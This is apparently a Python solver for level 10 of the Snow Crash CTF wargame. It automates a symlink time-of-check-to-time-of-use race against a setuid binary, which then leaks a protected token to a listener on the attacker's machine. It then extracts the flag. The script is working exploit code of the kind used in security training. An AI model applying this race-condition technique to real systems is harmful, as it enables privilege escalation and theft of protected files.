"""LEVEL 10"""

from pwn import listen

from utils.level_wrapper import level_handler


@level_handler
def solve_level10(path, snow_crash):
    """Launch link creation and run executable until timing succeeds"""

    conn = listen(6969)
    snow_crash.upload_file(f"{path}/create_link.sh", "/tmp/create_link.sh")
    snow_crash["touch /tmp/myfile"]
    # This scripts creates a link /tmp/token switching back and forth between /tmp/myfile and token
    snow_crash.run("/bin/bash /tmp/create_link.sh")
    # Run the executable 100 times to ensure perfect timing at least once
    snow_crash[f"for i in {'{0 .. 100}'}; do ./level10 /tmp/token 192.168.0.115; done"]
    password = ""
    i = 0
    while len(password) <= 8:
        conn.wait_for_connection()
        password = conn.recvall().decode().strip()
        if i > 10:
            # Trigger re-run if connection hangs
            return "timeout", "error"
        i += 1
    snow_crash[
        "pkill create_link.sh; rm -f /tmp/token /tmp/create_link.sh /tmp/myfile;"
    ]
    return "flag", password[8:]
